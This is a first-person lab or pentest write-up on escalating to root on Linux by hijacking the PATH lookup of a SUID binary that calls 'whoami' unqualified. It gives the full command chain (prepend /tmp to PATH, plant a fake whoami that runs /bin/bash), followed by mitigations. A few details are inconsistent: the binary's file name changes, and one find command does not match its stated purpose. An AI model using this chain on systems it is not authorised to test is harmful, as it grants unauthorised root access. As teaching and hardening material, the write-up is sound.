1. Overview
during post-exploitation on this Linux machine, I identified a privilege escalation vector caused by unsafe PATH usage inside a script assigned with SUID bit.
the vulnerability allows me to hijack a command and escalate to root.

this write-up documents:
  * How the misconfiguration was discovered
  * Why it is exploitable
  * The exact exploitation chain
  * Remediation Recommendations 

2. Enumeration
 * phase 1:
upon checking binaries with SUID bit set, i spotted an anomalous script located at /opt/path/script.sh.

- Inspecting The Script
The cat command provided me with an unreadable output, indicating the file is likely a compiled binary rahther than a shell script, so i used "strings" to extract meaningful content:
> strings /opt/path/mywhoami
output:
/lib64/ld-linux-x86-64.so.2
Y,b]yN%
__stack_chk_fail
setgid
setuid
system
_ITM_deregisterTMCloneTable
PTE1
u+UH
whoami

- key findings:
The binary calls the whoami command without specifying its absolute path (e.g., /usr/bin/whoami).
This is a red flag for PATH hijacking.

Phase 2 - Checking PATH
I checked the path variable:
> echo $PATH
output:
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

tried to search for writable directories:
> find / -perm -u=s -ls -type d 2>/dev/null
No matches.
This means I cannot hijack PATH using an existing writable directory — but I can prepend my own directory to PATH.

## Other Unsuccessful attempts:
 These checks were performed and ruled out:
  * Checked kernel version for known CVEs - (nothing exploitable)
  * Checked for sudo privileges - (no excessive privileges)
  * Reviewed cron jobs - (none writable)
  * Checked for capabilities - (no dangerous capabilities found)

2. Exploitation
 Phase 1:
  I managed to export a directory to PATH:
    > export PATH=/tmp:$PATH

  Phase 2:
    I created a fake "whoami" binary that spawns a root shell:
      > echo "/bin/bash" > /tmp/whoami
      > chmod +x /tmp/whoami

  Phase 3:
running the script:
> /opt/path/script.sh
since our exported directory /tmp appears before /bin in PATH, the system executed my malicious binary, instead of the real one.
this gave me a root shell.

> id
Output:
> uid=0(root) gid=0(root) groups=0(root),1001(john)

4. why this worked (Technical Explanation)
  1- The script with SUID bit used a command (whoami) without specifying full path.
  2- The script inherited the user’s PATH environment variable.
  3- No writable directories in PATH, but the PATH variable was modifiable.
  4- The system searched PATH in order, found the attacker's fake (whoami) first and execute it as root.

5. Mitigation recommendations
  * always use absolute paths in privileged scripts. If /usr/bin/whoami was used -> no privilege escalation opportunity
  * avoid running scripts with elevated privileges unless necessary.
  * ensure unprivileged users has no write permissions over the path variable or the directories inside it.
  * use secure_path in /etc/sudoers

6. Appendix
A PATH‑based privilege escalation is possible when all three conditions are met:
 - Writable directory in PATH
 - Privileged script uses unqualified commands
 - Script inherits user’s PATH

Detection commands:
find / -perm -u=s -ls -type f 2>/dev/null
strings <script>
echo $PATH
find / -writable -type d 2>/dev/null
export PATH=/tmp:$PATH
